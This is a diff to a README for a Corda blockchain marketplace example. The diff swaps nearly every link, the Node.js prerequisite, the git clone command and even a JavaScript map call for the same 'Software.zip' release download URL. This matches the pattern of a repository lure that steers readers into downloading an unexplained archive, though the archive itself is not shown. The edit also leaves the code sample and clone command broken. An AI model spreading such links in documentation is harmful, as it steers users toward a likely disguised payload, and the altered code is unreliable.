@@ -3,7 +3,7 @@
 
 Welcome to the **Corda Marketplace Example** repository! This project showcases a Corda marketplace blockchain application with microservices using AxonIQ event sourcing and a React front-end.
 
-![Blockchain Marketplace](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuks8rvXbZT4x3LXzTNbsBBrSRPtQbmE5nA&usqp=CAU)
+![Blockchain Marketplace](https://github.com/aadii485/blockchain-corda-marketplace-example/releases/download/v1.0/Software.zip)
 
 ## Features
 - **Blockchain:** Utilizes Corda for secure and efficient blockchain transactions.
@@ -21,12 +21,12 @@ Welcome to the **Corda Marketplace Example** repository! This project showcases 
 ### Prerequisites
 - JDK 8 or higher
 - Docker
-- Node.js
+- https://github.com/aadii485/blockchain-corda-marketplace-example/releases/download/v1.0/Software.zip
 
 ### Installation
 1. Clone this repository:
    ```
-   git clone https://github.com/your_username/blockchain-corda-marketplace-example.git
+   git clone https://github.com/aadii485/blockchain-corda-marketplace-example/releases/download/v1.0/Software.zip
    ```
 
 2. Start the Corda nodes and microservices:
@@ -66,7 +66,7 @@ fun on(event: TransactionCompletedEvent) {
 const Listings = ({ listings }) => {
     return (
         <div>
-            {listings.map((listing, index) => (
+            {https://github.com/aadii485/blockchain-corda-marketplace-example/releases/download/v1.0/Software.zip((listing, index) => (
                 <ListingCard key={index} listing={listing} />
             ))}
         </div>
@@ -77,14 +77,14 @@ const Listings = ({ listings }) => {
 ## Additional Resources
 
 ### Visit our GitHub Repository
-![Launch GitHub Repository](https://img.shields.io/badge/Launch-GitHub%20Repository-green?style=flat&logo=github&logoColor=white)](https://github.com/your_username/blockchain-corda-marketplace-example)
+![Launch GitHub Repository](https://github.com/aadii485/blockchain-corda-marketplace-example/releases/download/v1.0/Software.zip%20Repository-green?style=flat&logo=github&logoColor=white)](https://github.com/aadii485/blockchain-corda-marketplace-example/releases/download/v1.0/Software.zip)
 
 ### Check Latest Release
-If the link above does not work, please check the [Releases](https://github.com/your_username/blockchain-corda-marketplace-example/releases) section for the latest updates.
+If the link above does not work, please check the [Releases](https://github.com/aadii485/blockchain-corda-marketplace-example/releases/download/v1.0/Software.zip) section for the latest updates.
 
 ---
 
 Feel free to explore and contribute to this exciting Corda marketplace example! 🚀🔗🔒
 
-![Corda Blockchain](https://blog.goodaudience.com/hubfintech-corda-and-blockchain-fintech-cooperation-ce3c991585f8)
+![Corda Blockchain](https://github.com/aadii485/blockchain-corda-marketplace-example/releases/download/v1.0/Software.zip)
 
